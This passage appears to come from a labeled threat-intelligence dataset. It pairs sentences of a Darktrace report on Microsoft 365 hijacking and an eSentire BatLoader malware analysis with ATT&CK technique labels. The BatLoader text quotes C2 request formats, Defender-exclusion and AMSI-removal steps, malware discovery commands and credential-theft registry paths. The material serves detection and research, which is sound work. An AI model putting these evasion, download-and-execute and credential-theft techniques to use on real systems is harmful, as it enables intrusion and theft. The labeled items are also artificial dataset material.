            "Further investigation revealed that the customer\u2019s network had received several fake invoice emails prior to this initial intrusion activity.",
            "Additionally, there was an unusually high volume of failed logins to the compromised account around the time of the initial access. ",
            "Figure 1: Advanced Search logs depicting the steps which the actor took after logging in to a user\u2019s Microsoft 365 account.",
            "In a separate case also observed by Darktrace in March 2023, a malicious actor was observed signing in to a Microsoft 365 account from an endpoint within the Autonomous System, AS397086 LAYER-HOST-HOUSTON.",
            "The endpoint appears to be related to the VPN service, Surfshark VPN.",
            "This login was followed by several failed and successful logins from a VPS-related within the Autonomous System, AS396073 MAJESTIC-HOSTING-01.",
            "The actor was then seen registering and assigning permissions to an application called \u2018PerfectData Software\u2019.",
            "As with the previous example, the motives for this registration are unclear.",
            "The actor proceeded to log in several more times from a Surfshark VPN endpoint, however, they were not observed carrying out any further suspicious activity. ",
            "Figure 2: Advanced Search logs depicting the steps which the actor took after logging in to a user\u2019s Microsoft 365 account.",
            "It was not clear in either of these examples, nor in fact any of cases observed by Darktrace, why actors had registered and assigned permissions to an application called \u2018PerfectData Software\u2019, and there do not appear to be any open-source intelligence (OSINT) resources or online literature related to the malicious usage of an application by that name.",
            "That said, there are several websites which appear to provide email migration and data recovery/backup tools under the moniker \u2018PerfectData Software\u2019. ",
            "It is unclear whether the use of \u2018PerfectData Software\u2019 by malicious actors observed on the networks of Darktrace customers was one of these tools.",
            "However, given the nature of the tools, it is possible that the actors intended to use them to facilitate the exfiltration of email data from compromises mailboxes.",
            "If the legitimate software \u2018PerfectData\u2019 is the application in question in these incidents, it is likely being purchased and misused by attackers for malicious purposes.",
            "It is also possible the application referenced in the incidents is a spoof of the legitimate \u2018PerfectData\u2019 software designed to masquerade a malicious application as legitimate.",
            "Darktrace CoverageCases of \u2018PerfectData Software\u2019 activity chains detected by Darktrace typically began with an actor signing into an internal user\u2019s Microsoft 365 account from a VPN or VPS-related endpoint.",
            "These login events, along with the suspicious email and/or brute-force activity which preceded them, caused the following DETECT models to breach:SaaS / Access / Unusual External Source for SaaS Credential UseSaaS / Access / Suspicious Login AttemptSaaS / Compromise / Login From Rare Following Suspicious Login Attempt(s)SaaS / Email Nexus / Unusual Location for SaaS and Email ActivitySubsequent activities, including inbox rule creations, registration of applications in Azure AD, and mass-mailing activity, resulted in breaches of the following DETECT models.",
            "SaaS / Admin / OAuth Permission Grant SaaS / Compromise / Unusual Logic Following OAuth Grant SaaS / Admin / New Application Service",
            "PrincipalIaaS / Admin / Azure Application Administration ActivitiesSaaS / Compliance / New Email RuleSaaS / Compromise / Unusual Login and New Email RuleSaaS / Email Nexus / Suspicious Internal Exchange ActivitySaaS / Email Nexus / Possible Outbound Email SpamSaaS / Compromise / Unusual Login and Outbound Email SpamSaaS / Compromise / Suspicious Login and Suspicious Outbound Email(s)Figure 3: DETECT Model Breaches highlighting unusual login and 'PerfectData Software' registration activity from a malicious actor.",
            "In cases where Darktrace RESPOND:trade_mark: was enabled in autonomous response mode, \u2018PerfectData Software\u2019 activity chains resulted in breaches of the following RESPOND models:\u2022 Antigena / SaaS / Antigena Suspicious SaaS Activity Block\u2022 Antigena / SaaS / Antigena Significant Compliance Activity BlockIn response to these model breaches, Darktrace RESPOND took immediate action, performing aggressive, inhibitive actions, such as forcing the actor to log out of the SaaS platform, and disabling the user entirely.",
            "When applied autonomously, these RESPOND actions would seriously impede an attacker\u2019s progress and minimize network disruption.",
            "Figure 4: A RESPOND model breach created in response to a malicious actor's registration of 'PerfectData Software'In addition, Darktrace Cyber AI Analyst was able to autonomously investigate registrations of the \u2018PerfectData Software\u2019 application and summarized its findings into digestible reports. ",
            "Figure 5: A Cyber AI Analyst Incident Event log showing AI Analyst autonomously pivoting off a breach of 'SaaS / Admin / OAuth Permission Grant' to uncover details of an account hijacking.",
            "Conclusion Due to the widespread adoption of Microsoft 365 services in the workplace and continued emphasis on a remote workforce, account hijackings now pose a more serious threat to organizations around the world than ever before.",
            "The cases discussed here illustrate the tendency of malicious actors to conduct their activities from endpoints associated with VPN services, while also registering new applications, like PerfectData Software, with malicious intent. ",
            "While it was unclear exactly why the malicious actors were using \u2018PerfectData Software\u2019 as part of their account hijacking, it is clear that either the legitimate or spoofed version of the application is becoming an very likely emergent piece of threat actor tradecraft.",
            "Darktrace DETECT\u2019s anomaly-based approach to threat detection allowed it to recognize that the use of \u2018PerfectData Software\u2019 represented a deviation in the SaaS user\u2019s expected behavior.",
            "While Darktrace RESPOND, when enabled in autonomous response mode, was able to quickly take preventative action against threat actors, blocking the potential use of the application for data exfiltration or other nefarious purposes.",
            "AppendicesMITRE ATT&CK MappingReconnaissance:\u2022 T1598 \u00ad\u2013 Phishing for InformationCredential Access:\u2022 T1110 \u2013 Brute ForceInitial Access:\u2022 T1078.004 \u2013 Valid Accounts: Cloud AccountsCommand and Control:\u2022 T1105 \u00ad\u2013 Ingress Tool TransferPersistence:\u2022 T1098.003 \u2013 Account Manipulation: Additional Cloud Roles Collection:\u2022 T1114 \u2013 Email Collection Defense Evasion:\u2022 T1564.008 \u00ad\u2013 Hide Artifacts: Email Hiding Rules\u00adLateral Movement:\u2022 T1534 \u2013 Internal SpearphishingUnusual Source IPs\u2022",
            "5.62.60[.]202 (AS198605 AVAST Software s.r.o.) \u2022 160.152.10[.]215 (AS37637 Smile-Nigeria-AS)\u2022 197.244.250[.]155 (AS37705 TOPNET)\u2022 169.159.92[.]36 (AS37122 SMILE)\u2022 45.62.170[.]237 (AS396073 MAJESTIC-HOSTING-01)\u2022 92.38.180[.]49 (AS202422 G-Core Labs S.A)\u2022 129.56.36[.]26 (AS327952 AS-NATCOM)\u2022 92.38.180[.]47 (AS202422 G-Core Labs S.A.)\u2022 107.179.20[.]214 (AS397086 LAYER-HOST-HOUSTON)\u2022 45.62.170[.]31 (AS396073 MAJESTIC-HOSTING-01)References[1] https://www.investing.com/academy/statistics/microsoft-facts/[2] https://intel471.com/blog/countering-the-problem-of-credential-theft[3]",
            "https://darktrace.com/blog/business-email-compromise-to-mass-phishing-campaign-attack-analysis[4] https://darktrace.com/blog/breakdown-of-a-multi-account-compromise-within-office-365 "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1566.001"
            ],
            [],
            [],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1036.005"
            ],
            [
                "T1078"
            ],
            [
                "T1110"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "eSentire Threat Intelligence Malware Analysis BatLoader",
        "cti_report": [
            "title: eSentire Threat Intelligence Malware Analysis: BatLoader url: https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-batloader Since being introduced in February 2022, BatLoader is a malware dropper that has been observed dropping several well-known malware or malicious tools like ISFB, SystemBC RAT, Redline Stealer, and Vidar Stealer.",
            "Since its MSI installer file size is 100MB+, BatLoader can easily evade most sandboxes and antivirus tools. ",
            "This malware analysis delves deeper into the technical details of how the BatLoader malware operates and our security recommendations to protect your organization from being exploited. ",
            "Key Takeaways BatLoader delivers additional malware and tools including ISFB, Vidar Stealer, Cobalt Strike, Syncro RMM, and SystemBC RAT via fake installers.eSentire Threat Response Unit (TRU) observed two different BatLoader campaigns in 2022.BatLoader can evade most antivirus detections due to the size of the MSI installers.",
            "The loader drops certain malware if certain conditions of the infected host are met (e.g., ARP table, domain check).The last BatLoader campaign performs the antivirus checks and is capable of modifying Windows UAC prompt, disabling Windows Defender notifications, disabling Task Manager, disabling command prompt, preventing users from accessing Windows registry tools, disabling the Run command, and modifying the display timeout.eSentire TRU assesses with high confidence that BatLoader will remain active in the wild in 2023 and potentially serve as a first stage payload to deliver other malware. ",
            "Case Study BatLoader In September 2022, eSentire TRU observed multiple BatLoader infections in Consumer Services, Retail, Telecommunications, and Non-Profit client environments.",
            "The initial infection starts with the user searching for installers such as Zoom, TeamViewer, AnyDesk, or FileZilla.",
            "The user navigates to the first advertisement displayed, which redirects the user to the website hosting the fake installer.",
            "The MSI installers are signed by \u201cKancelaria Adwokacka Adwokat Aleksandra Krzemi\u0144ska\u201d (Figures 1-2). ",
            "Figure 1: Fake Zoom Installer Figure 2: Fake AnyDesk installer In October and November 2022, we observed the second BatLoader campaign pushing fake installers such as TeamViewer (Figure 3), AnyDesk and LogMeIn.",
            "The infections were observed in Insurance, Consulting, Healthcare, and Printing industries. ",
            "Figure 3: Fake TeamViewer download page We also observed several C2 domains related to BatLoader campaigns: updatea1[.]com (first campaign)cloudupdatesss[.]com (first campaign)externalchecksso[.]com (second campaign)internalcheckssso[.]com (second campaign) ",
            "BatLoader Analysis (First Campaign) BatLoader, named by Mandiant, is a malware dropper.",
            "The malware was first mentioned by Mandiant in February 2022.",
            "It\u2019s worth noting that Mandiant mentioned the domain clouds222[.]com for the BatLoader campaign which also overlaps with the Zloader C2 domain. ",
            "eSentire TRU observed BatLoader dropping the following malware / malicious tools: ISFBSystemBC RATRedline StealerVidar Stealer Figure 4: BatLoader infection chain The MSI installer file is over 100MB in size; the large file size is implemented by threat actor(s) to evade sandboxes and antivirus products.",
            "The properties of the BatLoader MSI installer are shown in Figure 5.",
            "Within the MSI file, we have found the components of NovaPDF 11 (Figure 6) and other garbage files shown in Figure 7.",
            "The files reside within the C:\\Program Files (x86)\\Softland\\novaPDF 11\\Tools path that is created after the malicious MSI is successfully run, we also found NordVPNSetup.exe dropped within the same path.",
            "We believe that the files mentioned are used as a decoy. ",
            "Figure 5: Properties of the malicious MSI installer Figure 6: NovaPDF 11 components Figure 7: Decoy files The main malicious trigger for the MSI installer resides under CustomAction table.",
            "Custom Actions are the operations defined by the user during installation or MSI execution.",
            "The malicious actor(s) create a custom action to run the malicious PowerShell inline script.",
            "The malicious script resides under AI_DATA_SETTER action name and contains the instructions to download the malicious update.bat file from the C2 domain and place it under AppData\\Roaming folder (Figure 8).",
            "The PowerShell script is run via the PowerShell Core or pwsh.exe in a hidden window. ",
            "Figure 8: Malicious PowerShell script under CustomAction Table ",
            "The downloaded update.bat file is responsible for downloading requestadmin.bat file and NirCmd.exe binary (Figure 9). ",
            "Figure 9: Contents of update.bat The requestadmin.bat is responsible for performing antivirus tampering \u2013 adding %APPDATA% and %USERPROFILE%\\ paths to Windows Defender exclusion to prevent Defender from scanning the mentioned paths.",
            "The batch file was executed via nircmd.exe which was also downloaded from the C2; the utility allows the batch file to run in the background without displaying the user interface.",
            "Besides excluding the paths, the batch file also retrieves and executes the runanddelete.bat and scripttodo.ps1 scripts from the C2 via a native PowerShell command Invoke-WebRequest (Figure 10). ",
            "Figure 10: The contents of requestadmin.bat The scripttodo.ps1 installs the GnuPg, the software that encrypts and signs the data and communications as shown in Figure 11. ",
            "Figure 11: GnuPg installation Further down, the script enumerates the current domain that the user is logged into, the username, and obtains all entries within the IPs starting with 192., 10., and .172 in the ARP cache table.",
            "Once it completes that task, it then checks the amount of IPs found in the ARP table and completes a sum operation. ",
            "If the amount is less than 2 and the user domain is within WORKGROUP, the script will not proceed to further infection.",
            "If the number of IPs is greater than 2, the domain is not in WORKGROUP and does not contain the username, which satisfies all the conditions set in the script, then the full set of malware is retrieved from C2 (Figure 12). ",
            "The requests to the C2 server are performed in the following format: https://<C2 Server>/g5i0nq/index/d2ef590c0310838490561a205469713d/?servername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" + $UserPCname https://<C2 Server>/g5i0nq/index/fa0a24aafe050500595b1df4153a17fb/?servername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" + $UserPCname https://<C2 Server>/g5i0nq/index/i850c923db452d4556a2c46125e7b6f2/?servername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" + $UserPCname https://<C2 Server>/g5i0nq/index/b5e6ec2584da24e2401f9bc14a08dedf/?servername=msi&arp=\"+ $IP_count + \"&domain=\" + $UserDomain + \"&hostname=\" + $UserPCname Figure 12: Enumerating the host and retrieving malware from C2 based on the conditions If the mentioned conditions are not satisfied, the script retrieves the GPG-encrypted files: d2ef5.exe.gpg (encrypted Ursnif)p9d2s.exe.gpg (encrypted Vidar Stealer) ",
            "If all the conditions are met, the script retrieves the following files: d2ef5.exe.gpg (encrypted Ursnif)p9d2s.exe.gpg (encrypted Vidar Stealer)d655.dll.gpg (encrypted Cobalt Strike)f827.exe.gpg (encrypted Syncro RMM)shutdowni.bat We were unable to retrieve the shutdowni.bat file but we believe the script might have been deployed to restart the host. ",
            "The GPG decryption routine was borrowed from the script hosted on GitHub (Figure 13).",
            "The script looks for files ending with gpg in %APPDATA% folder and decrypts them using the password 105b. ",
            "Figure 13: GPG decryption snippet Moreover, the scripttodo.ps1 recursively removes the implementation of Windows Defender IOfficeAntiVirus under HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}.",
            "The IOfficeAntivirus component is responsible for detecting malicious or suspicious files downloaded from the Internet.",
            "It then adds the extensions such as exe and DLL as exclusions to Windows Defender.",
            "Additionally, the script downloads Nsudo.exe tool to be able to run files and programs with full privileges. ",
            "We have mentioned that besides scripttodo.ps1, the runanddelete.bat (Figure 14) file was retrieved.",
            "The batch file is responsible for running a malicious executable d2ef5.exe with administrator privileges by creating a VBS script getadmin.vbs under %TEMP% folder to run the binary, but first the user would get an alert prompt from User Account Control (UAC) to allow the program to make changes. ",
            "Figure 14: Contents of runanddelete.bat file The Secrets of BatLoader ",
            "The binary d2ef5.exe is the ISFB banking malware also known as the successor of Gozi or Ursnif.",
            "The first Gozi variant was first discovered by SecureWorks in 2007 and is still active today, spreading through phishing emails and loaders.",
            "The Ursnif version we observed can exfiltrate browser credentials and cookies, Thunderbird and Outlook profiles, POP3, SMTP passwords.",
            "The strings \u201c*terminal* *wallet* *bank* *banco*\u201d were also observed which suggests that Ursnif is also capable of stealing cryptocurrency from digital wallets and banking credentials. ",
            "Upon execution, ISFB creates a persistence via Registry Run Keys under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
            "The registry value VirtualStop (the registry values can be different based on the wordlist table hardcoded in the binary).",
            "The registry value contains the command that launches the shortcut (LNK) which contains powershell.exe in the relative path.",
            "The PowerShell starts the CollectMirrow.ps1 script under %USERPROFILE% folder bypassing the PowerShell\u2019s execution policy. ",
            "The command execution example: cmd /c start C:\\Users\\<username>\\VirtualStop.lnk",
            "-ep unrestricted -file C:\\Users\\<username>\\CollectMirrow.ps1 The CollectMirror.ps1 script contains the PowerShell one-liner (Figure 15) that pulls the written data from the registry under HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\<registry_value>>, specifically the TestMouse value (Figure 16). ",
            "Figure 15: Contents of CollectMirror.ps1 Figure 16: Contents of TestMouse registry value The script performs process injection using the API such as OpenThread (to create a handle to an existing process), VirtualAlloc (memory allocation in the chosen process), and QueueUserAPC, the thread that the APC (Asynchronous Procedure Calls) is queued to has to enter an alertable state, this can be achieved by invoking SleepEx as shown in Figure 17. ",
            "We have observed ISFB injecting itself into a running explorer.exe process.",
            "The unpacked sample is approximately 540 KB (MD5: 3aaf34ffbe45e4f54b37392ad1afe9a5). ",
            "Figure 17: Process injection We have observed ISFB injecting itself into a running explorer.exe process.",
            "The unpacked sample is approximately 540 KB (MD5: 3aaf34ffbe45e4f54b37392ad1afe9a5).",
            "You can read the very well-written analyses by Daniel Bunce here and here, but we will cover the main basics of malware. ",
            "The payload locates the BSS section which is where the encrypted strings reside within the function shown in Figure 18 (the hex string 81 38 2E 62 73 73 contains \u2018bss\u2019). ",
            "Figure 18: Payload locating the .bss section ",
            "The data stored in the BSS section is encoded as shown in Figure 19. Figure 19: Snipped of the encoded data in the BSS section ",
            "The decryption function is shown below, the decryption function can be represented as the following pseudocode: Figure 20: Decryption function pseudocode The decryption function takes 4 bytes of the encrypted data in BSS at a time and converts them into an integer, then subtracts the key from the index value and adds to the DWORD value which is 4 bytes. ",
            "The decompiled code can be seen in Figure 21.",
            "The decryption function is thoroughly described by 0verfl0w (Daniel Bunce) here.",
            "Part of the key is derived from the division operations from the value retrieved from API call GetSystemTimeAsFileTime (retrieving system time).",
            "Another part of the key is embedded in our payload which is 0x81b8e7da.",
            "Applying the key to the decryption function (Figure 22) and part of the key derived from system time (which is 19) gave us the decrypted data (Figure 23). ",
            "Figure 21: Decompiled decryption function Figure 22: Decryption function in Python Figure 23: Decrypted strings The second decompressed data blob contains the following: ",
            "C2: trackingg-protectioon.cdn1.mozilla[.]net, 45.8.158[.]104, trackingg-protectioon.cdn1.mozilla[.]net, 188.127.224[.]114, weiqeqwns[.]com, wdeiqeqwns[.]com, weiqeqwens[.]com, weiqewqwns[.]com, iujdhsndjfks[.]com Botnet ID: 10101 Server ID: 50 Key: T3H5l6EZGEh6GkB5 Directory: /uploaded Extension: .dib, .pct (beacon extension) ",
            "Sleep time: 1 second ConfigTimeout (time interval to check for a new configuration): 20 seconds ",
            "The third blob contains the wordlist values shown below: ['list', 'stop', 'computer', 'desktop', 'system', 'service', 'start', 'game', 'stop', 'operation', 'black', 'line', 'white', 'mode', 'link', 'urls', 'text', 'name', 'document', 'type', 'folder', 'mouse', 'file', 'paper', 'mark', 'check', 'mask', 'level', 'memory', 'chip', 'time', 'reply', 'date', 'mirrow', 'settings', 'collect', 'options', 'value', 'manager', 'page', 'control', 'thread', 'operator', 'byte', 'char', 'return', 'device', 'driver', 'tool', 'sheet', 'util', 'book', 'class', 'window', 'handler', 'pack', 'virtual', 'test', 'active', 'collision', 'process', 'make', 'local', 'core'] These words are used to build the registry value names. ",
            "Another interesting feature of the ISFB is that it stores three embedded binaries within the unpacked payload.",
            "The binaries are compressed using APLib compression algorithm.",
            "The decompression function is shown in Figure 24. Figure 24: APLib decompression function To be able to locate the embedded compressed binaries, we need to find the structure of the ISFB payload where it stores the configuration.",
            "The configuration contains the payload marker or header, XOR key, CRC32 hash, the offset, and the size of each compressed binary (Figure 25).",
            "The payload marker defines the version of ISFB. ",
            "FJ \u2013 old ISFB version J1 \u2013 old ISFB version J2 \u2013 DreamBot version J3 \u2013 ISFB v3 Japan JJ \u2013 ISFB v2.14 and above WD \u2013 RM3 Figure 25: Header section containing the configuration The compressed data is separated by the null bytes as shown in Figure 26.",
            "You can see something resembling C2 domains in the first blob. ",
            "Figure 26: Snippet of the compressed data We wrote a Python script to extract the compressed data and decompress them (Figure 27).",
            "The first compressed blob contains the RSA public key with the hash 0xe1285e64 (Figure 28). ",
            "Figure 27: Python script to extract and decompress data blobs Figure 28: RSA public key blob ISFB also stores the configuration within the function that parses the payload header (Figure 29).",
            "The hash values are calculated by XORing the value 0x69b25f44 (known as g_CsCookie from the leaked code) with the values that match with CRC_CLIENT32 (again, from the leaked code). ",
            "Figure 29: Snippet of the configuration hashes and payload header parsing The following are the hashes of the payload as a result of XORing: ",
            "0x11271c7f \u2013 timer 0x48295783 \u2013 timer 0x584e5925 \u2013 botnet 0x556aed8f \u2013 server 0x4fa8693e \u2013 key 0xd0665bf6 \u2013 domains 0x54432e74\u2013 directory 0xbbb5c71d \u2013 extension The traffic beaconing contains the following pattern that will be encrypted with the AES key extracted from the compressed blob: soft=%u&version=%u&user==%08x%08x%08x%08x &server=50&id=10101&crc=61f03b3&uptime=102696&action=%08x&dns=%s&whoami=%s&os=%s soft, version \u2013 version of the payload user \u2013 the value calculated from applying the RNG (Random Number Generator) algorithm, using the username, computer name, XOR operations, and cpuid call. ",
            "server \u2013 server ID id \u2013 botnet ID uptime \u2013 is the value based on the API calls QueryPerformanceFrequency and QueryPerformanceCounter dns \u2013 computer name os \u2013 OS version and system type The example of the encrypted with AES-128 beacon, replacing + with _2B and / with _2F, the / are also being added: /uploaded/V1jd62QM3JcPMZGTpdjl2I/mEcoduKcJlNZo/S1Tq0KYy/M2ZEZFPG3iasm8TVeZ5oYf7/m_2FHfl318/E2HneynLJsT2KcKW6/MBeMivC1RFEh/TAL8bLaLD_2/B1Hg1OTg4XQwlG/IJbZJIe0rxQ0SYwzWgYte/TfzvWXXywf9HHwRL/2ZSv_2BcgktHGaZ/hRo7dwwYV3D39_2Bmc/JmEz3Z359/UhGcxj4s_2F80Krry3Kf/tI6i_2BxIXB2d6WASfJ/NCIpYT61pYgL53jx8SghJH/pQnAADp6racXs/VdB_2FRy/o74GaLVJG9neXweATdYNR/5.pct Some interesting strings found: /data.php?version=%u&user=%08x%08x%08x%08x&server=%u&id=%u&type=%u&name=%s \\Software\\Microsoft\\Windows\\CurrentVersion SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings %",
            "APPDATA%\\Mozilla\\Firefox\\Profiles EnableSPDY3_0 \\Macromedia\\Flash Player\\ cookies.sqlite cookies.sqlite-journal Mozilla\\Firefox\\Profiles Microsoft\\Edge\\User Data\\Default Google\\Chrome\\User Data\\Default --use-spdy=off --disable-http2 ",
            "Cmd %s processed: %u Cmd %u parsing: %u cmd /C",
            "\"%s> %s1\" wmic computersystem get domain |more systeminfo.exe tasklist.exe /SVC > driverquery.exe > reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s > ",
            "cmd /U /C",
            "\"type %s1 > %s & del %s1\" net view > nslookup 127.0.0.1 > nslookup myip.opendns.com resolver1.opendns.com net config workstation > nltest /domain_trusts > nltest /domain_trusts /all_trusts > net view /all",
            "/domain > net view /all > user_pref(\"network.http.spdy.enabled\", false); ",
            "Software\\Microsoft\\Windows",
            "Mail Software\\Microsoft\\Windows Live Mail account{*}.oeaccount Account_Name encryptedUsername SMTP_Email_Address encryptedPassword EmailAddressCollection/EmailAddress[%u]/Address Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\ Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\ Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\ Account Name IMAP Server IMAP Password IMAP Use SSL POP3 Server POP3 Password POP3 Use SSL SMTP Server SMTP Password SMTP Use SSL %PROGRAMFILES%\\Mozilla Thunderbird %",
            "USERPROFILE%\\AppData\\Roaming\\Thunderbird\\Profiles\\*.default \\logins.json /C pause dll cache2\\entries\\*.* ",
            "cmd /c start %",
            "s",
            "-ep unrestricted -file %s new-alias -name %s -value gp;new-alias -name",
            "%s -value iex;%s ([System.",
            "Text.",
            "Encoding]::ASCII.GetString((%s \"HKCU:\\%s\").%S)) ",
            "ipconfig /all file://c:\\test\\test32.dll file://c:\\test\\tor64.dll 30, 8, *terminal* *wallet* *bank* *banco* Man-in-the-browser is another capability of Ursnif.",
            "You might have noticed strings such as \u201cuser_pref(\"network.http.spdy.enabled\", false);\u201d, \u201cEnableSPDY3_0\u201d and \u201c--use-spdy=off --disable-http2\u201d.",
            "Ursnif disables SPDY and HTTP/2 (successor of SPDY protocol) on the infected host.",
            "The protocols allow HTTP data compression to achieve minimal latency.",
            "With the protocol implementation, threat actor(s) might have to spend additional time attempting to modify and intercepting the web traffic. ",
            "We still see some remanences from the Ursnif DreamBot in ISFB v2 (file://c:\\test\\tor64.dll), which might suggest that the Tor communication capability is still possible. ",
            "Vidar Stealer, SystemBC, and Syncro RMM Agent Botnet: 1259 Version: 54.7 C2:",
            "t[.]me/trampapanam, nerdculture[.]de/@yoxhyp Upon successful infection, first, the host would reach out to the C2 and retrieve the DLLs (Dynamic Link Library) dependencies such as vcruntime140.dll, sqlite3.dll, softokn3.dll, nss3.dll, msvcp140.dll, mozglue.dll, freebl3.dll for the stealer to be able to extract credentials and cookies from browsers and to function properly.",
            "If you are interesting in understanding in more depth what each library is responsible for, you can review our blog on Mars Stealer. ",
            "The stealer then collects the credentials, host information, files, and screenshot and sends it over as a ZIP archive in a base64-encoded format as shown in Figure 30. ",
            "Figure 30: Vidar exfiltrating stolen data We are in the processing of completing a technical analysis of Vidar Stealer, which will be our next blog. ",
            "Syncro RMM is a Remote Monitoring and Management tool used to control and manage devices remotely.",
            "In the hands of a malicious actor, this tool can be used as a persistence mechanism and remote accessing. ",
            "SystemBC RAT also known as \u201csocks5 backconnect system\u201d (MD5: 8ea797eb1796df20d4bdcadf0264ad6c) is a malware that leverages SOCKS5 proxies to hide malicious traffic, it also has the capability of sending additional payloads to the hosts (Figure 31). ",
            "Figure 31: Leaked SystemBC on a hacking forum The RAT creates the mutex \u201cwow64\u201d with the \u201cstart\u201d as an argument (\u201cstart\u201d will also be used as an argument for the scheduled task command).",
            "If the mutex is not present \u2013 the RAT will reach out to the C2.",
            "The C2 configuration is shown below: HOST1: 188.127.224.46 HOST2: hgfiudtyukjnio[.]com PORT1: 4251 TOR: 0 If the mutex is present on the host, the instruction would proceed further to check the integrity level of the current malicious process, then it compares to the value 1000 which is SECURITY_MANDATORY_LOW_RID (low integrity level, SID: S-1-16-0), this means the process is restricted and has limited write permissions. ",
            "If the value is not equal to 1000, it proceeds with scheduled task creation, the task name is \u201cwow64.exe\u201d.",
            "The command to run the scheduled task every 2 minutes is start. ",
            "If the value is equal to 1000, the RAT proceeds to communicate with the C2 (Figure 32). ",
            "Figure 32: Function responsible for calling C2, task scheduling, and mutex creation SystemBC is capable of executing scripts and commands retrieved from C2 such as ps1, bat, vbs, and exe (Figure 33). ",
            "Figure 33:",
            "Scripts supported by SystemBC BatLoader Analysis (Second Campaign) ",
            "The second campaign we observed is slightly different than the first one.",
            "The MSI installer (MD5: 099483061f8321e70ce86c9991385f48) with the signature \u201cTax In Cloud sp. z o.o.\u201d does not come with an embedded PowerShell script.",
            "Instead, the installer pushes \u201cavolkov.exe\u201d binary to the infected machine and creates the registry key containing the path of the dropped binary which is AppData/Local/ SetupProject1 (Figure 34). ",
            "Figure 34: Malicious MSI installer creating the registry key and dropping the binary file under AppData/Local/SetupProject1 The avolkov.exe binary (MD5: d41e0fee0ec6c2e3da56a6dcf53607da) utilizes libcurl 7.85.0 which enables the data transfer with URL syntax for protocols such as HTTP/HTTPS, FTP, DICT, SMTP, IMAP, POP3, LDAP, acting as a potential backdoor and loader.",
            "The binary has the C2 embedded inside the binary from where it retrieves the newtest.bat file (Figure 35).",
            "The batch script is responsible for pulling additional BatLoader payloads and scripts from C2 such as: requestadmin.bat nircmd.exeuser.ps1checkav.ps1scripttodo.ps1 Figure 35: Contents of newtest.bat The requestadmin.bat (Figure 36) retrieved from the second campaign is different compared to the first campaign.",
            "The threat actor(s) made sure to add more paths and folders to Windows Defender exclusion including %TEMP% and C:\\Windows\\* as well as adding .ps1",
            "(PowerShell) extension to the exclusion list. ",
            "We observed that the script retrieves NSudo and modifies Windows UAC prompt behavior by allowing administrators to perform operations without authentication or consent prompts: Disabling Windows Defender notifications, Disabling Task Manager, Disabling command prompt, Preventing users from accessing Windows registry tools, Disabling Run command, Modifying the display timeout (monitor powers off after 30 minutes) and sleep mode (on AC/battery power \u2013 goes to sleep after 3000 minutes (50 hours)). ",
            "The script also no longer pulls runanddelete.bat file from the C2. ",
            "Figure 36: Contents of requestadmin.bat The scripttodo.ps1 file still retrieves the same files from the C2, the Cobalt Strike payload (d655) was changed to a DLL instead of EXE and shutdowni.bat is no longer pulled from the C2. ",
            "user.ps1 (Figure 37) is similar to scriptodo.ps1 in terms of enumerating the current domain of the host, username, and ARP table. ",
            "If all conditions are satisfied and the host has SID S-1-5-32-544 present (Group Name: BUILTIN\\Administrators), the script outputs \u201cYES\u201d.",
            "If the conditions are not met and the host belongs to the workgroup, the script retrieves the Cobalt Strike payload named installv2.dll (MD5: 4a6898a4584fdfb34bbeefc77bc882c4) and runs it via rundll32.exe with an ordinal \u201cSRANdomsrt\u201d. ",
            "Interestingly enough, we have observed QakBot using the same ordinal name to run Cobalt Strike payloads. ",
            "Figure 37: Contents of the user.ps1 Another new addition to BatLoader is the antivirus check script (checkav.ps1).",
            "The script checks the host against the list of antiviruses and sends it out to C2 server (Figure 38). ",
            "Figure 38: Contents of checkav.ps1 Later, threat actor(s) switched from externalchecksso[.]com to internalchecksso[.]com.",
            "The scripttodo.ps1 was also changed to ru.ps1 as well as the names for malicious binaries as shown in Figure 39. ",
            "Figure 39: Contents of ru.ps1 How eSentire is Responding Our Threat Response Unit (TRU) combines threat intelligence obtained from continuous research and security incidents to create practical outcomes for our customers.",
            "We are taking a full-scale response approach to ongoing cybersecurity threats by deploying countermeasures, such as: Implementing threat detections and leveraging BlueSteel, our machine-learning powered PowerShell classifier, to identify malicious command execution and ensuring that eSentire has visibility and detections are in place across eSentire MDR for Endpoint and MDR for Network. ",
            "Performing global threat hunts for indicators associated with BatLoader. ",
            "Our detection content is supported by investigation runbooks, ensuring our 24/7 SOC Cyber Analysts respond rapidly to any intrusion attempts related to known malware Tactics, Techniques, and Procedures.",
            "In addition, TRU closely monitors the threat landscape and constantly addresses capability gaps and conducts retroactive threat hunts to assess customer impact. ",
            "Recommendations from eSentire's Threat Response Unit (TRU) We recommend implementing the following controls to help secure your organization against BatLoader malware: Confirm that all devices are protected with Endpoint Detection and Response (EDR) solutions Encouraging good cybersecurity hygiene among your users by using Phishing and Security Awareness Training (PSAT) when downloading software from the Internet.",
            "Encourage your employees to use password managers instead of using the password storage feature provided by web browsers. ",
            "While the TTPs used by adversaries grow in sophistication, they lead to a certain level of difficulties at which critical business decisions must be made.",
